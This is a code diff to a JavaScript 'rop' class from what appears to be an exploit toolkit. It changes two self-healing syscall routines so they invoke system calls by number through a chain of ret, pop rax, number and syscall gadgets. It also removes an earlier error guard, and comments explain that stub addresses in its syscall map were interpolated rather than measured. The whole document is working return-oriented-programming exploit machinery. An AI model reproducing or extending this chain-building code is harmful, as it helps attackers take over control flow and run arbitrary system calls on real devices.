@@ -255,17 +255,43 @@ class rop {
     }
 
     self_healing_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        /* These push the stub address as a raw chain slot and re-arm it by
-           writing that same address into the restore point, so there is
-           nowhere to load rax and the by-number path does not fit. A syscall
-           that only has a by-number entry would run whatever rax happened to
-           hold, so refuse it here rather than later and quietly. */
-        if (this.p.byNumberOnly && this.p.byNumberOnly[sysc])
-            throw new Error("self_healing_syscall: 0x" + sysc.toString(16)
-                + " is callable by number but its stub address is unknown"
-                + " (.70 inserted stubs and no landmark brackets this one)."
-                + " Use add_syscall/syscall instead.");
         this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
+        /* By number here too, not by stub address.
+           ---------------------------------------------------------------
+           This form reserves four slots -- three `ret` placeholders and the
+           call target -- and re-arms itself by writing the same four values
+           back over them. That happens to be exactly the room the by-number
+           sequence needs: ret, `pop rax`, the number, then the syscall
+           instruction. So the self-healing property is kept while the stub
+           address stops mattering.
+
+           It has to stop mattering. 272 of the addresses in syscall_map were
+           interpolated across a step rather than measured, the block is a
+           0x20 grid, and this is the one path that jumps to them raw. A miss
+           by one slot runs a different syscall -- which is what
+           "driver affinity did not read back after the restore" and the
+           worker never answering look like from the outside.
+
+           Alignment is decided BEFORE the four slots rather than between
+           them: the original could pad in the middle only because all three
+           placeholders were the same `ret`. These four are not
+           interchangeable, so the pad goes in front and the target keeps the
+           parity it had. */
+        if (this.p.syscall_insn) {
+            if (this.stack_entry_point.add32((this.count + 3) * 0x8).low & 0x8)
+                this.push(this.gadgets["ret"]);
+            const rp = this.get_rsp();
+            this.push(this.gadgets["ret"]);
+            this.push(this.gadgets["pop rax"]);
+            this.push(sysc);
+            this.push(this.p.syscall_insn);
+            this.push_write8(rp, this.gadgets["ret"]);
+            this.push_write8(rp.add32(0x08), this.gadgets["pop rax"]);
+            this.push_write8(rp.add32(0x10), sysc);
+            this.push_write8(rp.add32(0x18), this.p.syscall_insn);
+            return;
+        }
+
         let restore_point = this.get_rsp();
         this.push(this.gadgets["ret"]);
         this.push(this.gadgets["ret"]);
@@ -320,16 +346,6 @@ class rop {
     }
 
     self_healing_syscall_2(sysc, rdi = undefined, deref_rdi = false, rsi = undefined, deref_rsi = false, rdx = undefined, deref_rdx = false, rcx = undefined, deref_rcx = false, r8 = undefined, deref_r8 = false, r9 = undefined, deref_r9 = false) {
-        /* These push the stub address as a raw chain slot and re-arm it by
-           writing that same address into the restore point, so there is
-           nowhere to load rax and the by-number path does not fit. A syscall
-           that only has a by-number entry would run whatever rax happened to
-           hold, so refuse it here rather than later and quietly. */
-        if (this.p.byNumberOnly && this.p.byNumberOnly[sysc])
-            throw new Error("self_healing_syscall: 0x" + sysc.toString(16)
-                + " is callable by number but its stub address is unknown"
-                + " (.70 inserted stubs and no landmark brackets this one)."
-                + " Use add_syscall/syscall instead.");
 
         if (rsi !== undefined) {
             if (deref_rsi) {
@@ -401,6 +417,42 @@ class rop {
                 this.push(this.gadgets["pop rdi"]);
                 this.push(rdi);
             }
+        }
+
+        /* By number here too, not by stub address.
+           ---------------------------------------------------------------
+           This form reserves four slots -- three `ret` placeholders and the
+           call target -- and re-arms itself by writing the same four values
+           back over them. That happens to be exactly the room the by-number
+           sequence needs: ret, `pop rax`, the number, then the syscall
+           instruction. So the self-healing property is kept while the stub
+           address stops mattering.
+
+           It has to stop mattering. 272 of the addresses in syscall_map were
+           interpolated across a step rather than measured, the block is a
+           0x20 grid, and this is the one path that jumps to them raw. A miss
+           by one slot runs a different syscall -- which is what
+           "driver affinity did not read back after the restore" and the
+           worker never answering look like from the outside.
+
+           Alignment is decided BEFORE the four slots rather than between
+           them: the original could pad in the middle only because all three
+           placeholders were the same `ret`. These four are not
+           interchangeable, so the pad goes in front and the target keeps the
+           parity it had. */
+        if (this.p.syscall_insn) {
+            if (this.stack_entry_point.add32((this.count + 3) * 0x8).low & 0x8)
+                this.push(this.gadgets["ret"]);
+            const rp = this.get_rsp();
+            this.push(this.gadgets["ret"]);
+            this.push(this.gadgets["pop rax"]);
+            this.push(sysc);
+            this.push(this.p.syscall_insn);
+            this.push_write8(rp, this.gadgets["ret"]);
+            this.push_write8(rp.add32(0x08), this.gadgets["pop rax"]);
+            this.push_write8(rp.add32(0x10), sysc);
+            this.push_write8(rp.add32(0x18), this.p.syscall_insn);
+            return;
         }
 
         let restore_point = this.get_rsp();
